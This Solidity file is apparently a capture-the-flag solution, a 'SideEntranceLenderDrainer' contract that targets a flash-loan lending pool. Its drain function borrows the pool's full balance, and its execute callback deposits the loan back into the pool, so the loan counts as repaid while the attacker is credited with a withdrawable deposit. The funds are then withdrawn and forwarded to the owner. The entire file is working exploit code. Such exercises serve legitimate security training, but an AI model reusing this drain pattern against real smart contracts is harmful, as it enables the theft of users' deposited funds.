// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import './SideEntranceLenderPool.sol';

/**
 * @title SideEntranceLenderDrainer
 * @author Patate
 */
contract SideEntranceLenderDrainer is IFlashLoanEtherReceiver {
    address payable public immutable owner;
    SideEntranceLenderPool public immutable sideEntranceLenderPool;

    constructor(SideEntranceLenderPool _sideEntranceLenderPool) {
        owner = payable(msg.sender);
        sideEntranceLenderPool = _sideEntranceLenderPool;
    }

    function drain() external payable {
        sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);
        sideEntranceLenderPool.withdraw();
    }

    function execute() external payable override {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    receive() external payable {
        owner.transfer(msg.value);
    }
}
